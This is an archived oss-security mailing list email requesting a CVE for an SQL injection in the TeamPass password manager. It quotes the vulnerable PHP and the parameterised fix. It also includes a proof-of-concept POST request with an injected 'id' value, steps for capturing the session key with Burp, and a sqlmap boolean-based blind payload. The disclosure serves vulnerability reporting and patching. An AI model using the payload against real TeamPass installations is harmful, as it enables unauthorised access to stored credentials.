X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4224" "Thursday" "14" "April" "2016" "12:08:26" "+0800" "das das" "scusec2010@gmail.com" "<CAAjTPb_6JSyPtQRR_xCR0gXv7hCqnu2D0MLgu4aBkex=X-wViQ@mail.gmail.com>" "116" "[oss-security] CVE request:SQL injection in TeamPass" "^Date:" nil nil "4" "2016041404:08:26" "[oss-security] CVE request:SQL injection in TeamPass" (number mark "        scusec2010@g Apr 14  116/4224  " thread-indent "\"[oss-security] CVE request:SQL injection in TeamPass\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 11596 invoked by uid 550); 14 Apr 2016 07:05:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 5215 invoked from network); 14 Apr 2016 04:08:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to
         :content-transfer-encoding;
        bh=P8tG+RRdCluJNMvLXbOn0kpgCovhjezshIJ1FjA3UJ0=;
        b=HBzj090gn2tWl9ugcLMgtA3/Db6kY08VXVqJQ33U34RlOA0zsDsD0PEFVSUj3m+I/k
         1R1XgGZt/RLXsu0UVGX8nWkacxgKsJ7OZ2PhcIgEB0z61AC8o7AST6vO0nYY+/RkE1dX
         lobQugNwKwuAusyKfhDZ8fp8yP8TCLDYXMrUWEb1/1d3yvVe2hDUue87WesE5Kv2/27u
         APrWkib/DMpcC6yQMjK3UroCvsPMQvHsQWBw6/IjLAVq3t5f5DBn6BxCSmQd+z9qJoIs
         9vRrwY1IyXgF7Q2O+CW7UbWRNJixp3BvchQOmE8ZXkM/AX8UawRwahhWW75XmVvUpv0u
         obZQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
         :content-transfer-encoding;
        bh=P8tG+RRdCluJNMvLXbOn0kpgCovhjezshIJ1FjA3UJ0=;
        b=CVn9Er2gAUM+1KG1NgEVYhh5snZWQzM9mSz35bVmYxzSR7Y6xhy1lMV0gqiwuw/I1w
         t27AJUGXiKFLmxEVonQjYsytlRiUCfWvGVnS6VJjukhoKU0DwAKEaf/MDzOyoeKrgUSJ
         PrggAzrab+V7aYWY9y5YzbQvCslH0nb6mTKF9dp5+UK5X4tZ84e9mb0ODOCAmVkeQPho
         y22jCImxRI2eTOs+K3u3KTwuUsXyq6BUKGVYmTrMLnOsO5Ipzgt0CGTJgqq4bZwPfNNy
         STfcakjtD537BHw8LqOB4uS8shsVIBUBJgqApMUNP5JrqvcpXV7vbBxJmq35VzjG//w7
         3KWg==
X-Gm-Message-State: AOPr4FX70WKdoJa8FlgZTrFB8TORSeg39Tl6hkPM7FYI63i/VaWa6J6zL0Z0WHr6qlzqcejtFG5hDke47oReIQ==
MIME-Version: 1.0
X-Received: by 10.182.242.4 with SMTP id wm4mr6509950obc.85.1460606906866;
 Wed, 13 Apr 2016 21:08:26 -0700 (PDT)
Message-ID: <CAAjTPb_6JSyPtQRR_xCR0gXv7hCqnu2D0MLgu4aBkex=X-wViQ@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
Date: Thu, 14 Apr 2016 12:08:26 +0800
From: das das <scusec2010@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE request:SQL injection in TeamPass
To: oss-security@lists.openwall.com

Hello again,
I sent you an email two days ago,which was misformatted.Now I resend
it from a gmail account.Hope this time it displays normally.
I'd like to request a CVE-ID for the vulnerability found in
TeamPass-2.1.24 and TeamPass-2.1.25. TeamPass is a Passwords Manager
dedicated for managing passwords in a collaborative way on any server
Apache, MySQL and PHP.
Here is the issue,
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
SQL injection vectors in sources/users.queries.php
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-------------------------code_start TeamPass-2.1.24-------------------------
if (!checkUser($_SESSION['user_id'], $_SESSION['key'], "manage_users")) {
    $_SESSION['error']['code'] =3D ERR_NOT_ALLOWED; //not allowed page
    include $_SESSION['settings']['cpassman_dir'].'/error.php';
    exit();
}
........
/**
* UPDATE MANAGER RIGHTS FOR USER
*/
case "gestionnaire":
  // Check KEY
  if ($_POST['key'] !=3D $_SESSION['key']) {
   // error
    exit();
    }
  DB::update(
    prefix_table("users"),
    array(
       'gestionnaire' =3D> $_POST['value']
      ),
      "id =3D ".$_POST['id']
      );
  break;
-------------------------code_end TeamPass-2.1.24--------------------------
-------------------------code_start TeamPass-2.1.25-------------------------
if (!checkUser($_SESSION['user_id'], $_SESSION['key'], "manage_users")) {
    $_SESSION['error']['code'] =3D ERR_NOT_ALLOWED; //not allowed page
    include $_SESSION['settings']['cpassman_dir'].'/error.php';
    exit();
}
........
/**
* UPDATE MANAGER RIGHTS FOR USER
*/
 case "gestionnaire":
     // Check KEY
     if ($_POST['key'] !=3D $_SESSION['key']) {
         // error
         exit();
     }

     DB::update(
         prefix_table("users"),
         array(
             'gestionnaire' =3D> $_POST['value'],
             'admin' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1",
             'read_only' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1"
            ),
         "id =3D ".$_POST['id']
     );
     echo prepareExchangedData(array("error" =3D> ""), "encode");
     break;
-------------------------code_end TeamPass-2.1.25--------------------------

When the post parameter 'type' =3D 'gestionnaire', the function 'update
manager rights for user' will be excuted. it checks the user's role in
the beginning, and needs the authority of manage_user to access to
this page
The SQL injection happens in  ---code_start--- "id =3D ".$_POST['id']
---code_end---, the post parameter 'id' is not properly handled.
To execute the SQL query,it verifies that if the the post parameter
'key' equals session['key'].We can get the key through this
way=EF=BC=9Arefresh the page(e.g index.php?page=3Dmanage_main), capture the
packet using tools (e.g Burp Suit), and forward the packet,then we can
get the value of session 'key' in the request body.
e.p
http://localhost/teampass/sources/users.queries.php
POST:
type=3Dgestionnaire&key=3DAfVvIafUhSpWwzTnRM9LWEFxrX3gLmK4xoQ4dDDrsPM8.TpnC=
r&value=3D0&id=3D1'
Sqlmap payload:
sqlmap identified the following injection point(s) with a total of 43
HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: MySQL >=3D 5.0 boolean-based blind - Parameter replace
    Payload: type=3Dgestionnaire&key=3D8ILEoZI08Lkquj5gonpx425wD46ANdkTiIIA=
JmGVHJhM6S9BaJ&&value=3D1&id=3D(SELECT
(CASE WHEN (6429=3D6429) THEN 6429 ELSE 6429*(SELECT 6429 FROM
INFORMATION_SCHEMA.CHARACTER_SETS) END))
    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE
[RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS)
END))
---
To fix it,
 ---code_start---
DB::update(
         prefix_table("users"),
         array(
             'gestionnaire' =3D> $_POST['value'],
             'admin' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1",
             'read_only' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1"
            ),
         "id =3D %i",
         $_POST['id']
     );
 ---code_end---

This issue was discovered by Mereme[D.A.S] of Information Security
Institute @ Sichuan University.
Thank you for your time and guidance!
